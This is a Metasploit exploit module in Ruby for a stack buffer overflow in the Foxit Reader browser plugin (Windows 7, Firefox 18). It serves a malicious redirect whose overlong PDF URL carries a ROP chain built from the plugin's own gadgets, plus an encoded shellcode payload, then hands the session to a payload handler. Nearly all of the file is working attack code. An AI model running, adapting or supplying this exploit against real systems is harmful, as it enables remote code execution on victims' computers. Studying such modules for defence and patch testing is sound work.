 
class Metasploit3 < Msf::Exploit::Remote
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    Rank = NormalRanking
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Foxit Reader Plugin URL Processing Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in the Foxit Reader Plugin, it exists in
                    the npFoxitReaderPlugin.dll module. When loading PDF files from remote hosts,
                    overly long query strings within URLs can cause a stack-based buffer overflow,
                    which can be exploited to execute arbitrary code. This exploit has been tested
                    on Windows 7 SP1 with Firefox 18.0 and Foxit Reader version 5.4.4.11281
                    (npFoxitReaderPlugin.dll version 2.2.1.530).
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;rgod <rgod[at]autistici.org>&#039;,       # initial discovery and poc
                    &#039;Sven Krewitt <svnk[at]krewitt.org>&#039;, # metasploit module
                    &#039;juan vazquez&#039;,                       # metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;89030&#039; ],
                    [ &#039;BID&#039;, &#039;57174&#039; ],
                    [ &#039;EDB&#039;, &#039;23944&#039; ],
                    [ &#039;URL&#039;, &#039;http://retrogod.altervista.org/9sg_foxit_overflow.htm&#039; ],
                    [ &#039;URL&#039;, &#039;http://secunia.com/advisories/51733/&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 2000,
                    &#039;DisableNops&#039; => true
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;EXITFUNC&#039; => "process",
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # npFoxitReaderPlugin.dll version 2.2.1.530
                    [ &#039;Automatic&#039;, {} ],
                    [ &#039;Windows 7 SP1 / Firefox 18 / Foxit Reader 5.4.4.11281&#039;,
                        {
                            &#039;Offset&#039;          => 272,
                            &#039;Ret&#039;             => 0x1000c57d, # pop # ret # from npFoxitReaderPlugin
                            &#039;WritableAddress&#039; => 0x10045c10, # from npFoxitReaderPlugin
                            :rop => :win7_rop_chain
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Jan 7 2013",
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def get_target(agent)
        #If the user is already specified by the user, we&#039;ll just use that
        return target if target.name != &#039;Automatic&#039;
 
        #Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0
        nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || &#039;&#039;
        firefox = agent.scan(/Firefox\/(\d+\.\d+)/).flatten[0] || &#039;&#039;
 
        case nt
            when &#039;5.1&#039;
                os_name = &#039;Windows XP SP3&#039;
            when &#039;6.0&#039;
                os_name = &#039;Windows Vista&#039;
            when &#039;6.1&#039;
                os_name = &#039;Windows 7&#039;
        end
 
        if os_name == &#039;Windows 7&#039; and firefox =~ /18/
            return targets[1]
        end
 
        return nil
    end
 
    def junk
        return rand_text_alpha(4).unpack("L")[0].to_i
    end
 
    def nops
        make_nops(4).unpack("N*")
    end
 
    # Uses rop chain from npFoxitReaderPlugin.dll (foxit) (no ASLR module)
    def win7_rop_chain
 
        # rop chain generated with mona.py - www.corelan.be
        rop_gadgets =
            [
                0x1000ce1a, # POP EAX # RETN [npFoxitReaderPlugin.dll]
                0x100361a8, # ptr to &VirtualAlloc() [IAT npFoxitReaderPlugin.dll]
                0x1000f055, # MOV EAX,DWORD PTR DS:[EAX] # RETN [npFoxitReaderPlugin.dll]
                0x10021081, # PUSH EAX # POP ESI # RETN 0x04 [npFoxitReaderPlugin.dll]
                0x10007971, # POP EBP # RETN [npFoxitReaderPlugin.dll]
                0x41414141, # Filler (RETN offset compensation)
                0x1000614c, # & push esp # ret  [npFoxitReaderPlugin.dll]
                0x100073fa, # POP EBX # RETN [npFoxitReaderPlugin.dll]
                0x00001000, # 0x00001000-> edx
                0x1000d9ec, # XOR EDX, EDX # RETN
                0x1000d9be, # ADD EDX,EBX # POP EBX # RETN 0x10 [npFoxitReaderPlugin.dll]
                junk,
                0x100074a7, # POP ECX # RETN [npFoxitReaderPlugin.dll]
                junk,
                junk,
                junk,
                0x41414141, # Filler (RETN offset compensation)
                0x00000040, # 0x00000040-> ecx
                0x1000e4ab, # POP EBX # RETN [npFoxitReaderPlugin.dll]
                0x00000001, # 0x00000001-> ebx
                0x1000dc86, # POP EDI # RETN [npFoxitReaderPlugin.dll]
                0x1000eb81, # RETN (ROP NOP) [npFoxitReaderPlugin.dll]
                0x1000c57d, # POP EAX # RETN [npFoxitReaderPlugin.dll]
                nops,
                0x10005638, # PUSHAD # RETN [npFoxitReaderPlugin.dll]
            ].flatten.pack("V*")
 
        return rop_gadgets
    end
 
    def on_request_uri(cli, request)
 
        agent = request.headers[&#039;User-Agent&#039;]
        my_target = get_target(agent)
 
        # Avoid the attack if no suitable target found
        if my_target.nil?
            print_error("Browser not supported, sending 404: #{agent}")
            send_not_found(cli)
            return
        end
 
        unless self.respond_to?(my_target[:rop])
            print_error("Invalid target specified: no callback function defined")
            send_not_found(cli)
            return
        end
 
        return if ((p = regenerate_payload(cli)) == nil)
 
        # we use two responses:
        # one for an HTTP 301 redirect and sending the payload
        # and one for sending the HTTP 200 OK with appropriate Content-Type
        if request.resource =~ /\.pdf$/
            # sending Content-Type
            resp = create_response(200, "OK")
            resp.body = ""
            resp[&#039;Content-Type&#039;] = &#039;application/pdf&#039;
            resp[&#039;Content-Length&#039;] = rand_text_numeric(3,"0")
            cli.send_response(resp)
            return
        else
            resp = create_response(301, "Moved Permanently")
            resp.body = ""
 
            my_host = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
            if datastore[&#039;SSL&#039;]
                schema = "https"
            else
                schema = "http"
            end
 
            sploit = rand_text_alpha(my_target[&#039;Offset&#039;] - "#{schema}://#{my_host}:#{datastore[&#039;SRVPORT&#039;]}#{request.uri}.pdf?".length)
            sploit << [my_target.ret].pack("V") # EIP
            sploit << [my_target[&#039;WritableAddress&#039;]].pack("V") # Writable Address
            sploit << self.send(my_target[:rop])
            sploit << p.encoded
 
            resp[&#039;Location&#039;] = request.uri + &#039;.pdf?&#039; + Rex::Text.uri_encode(sploit, &#039;hex-all&#039;)
            cli.send_response(resp)
 
            # handle the payload
            handler(cli)
        end
    end
 
end

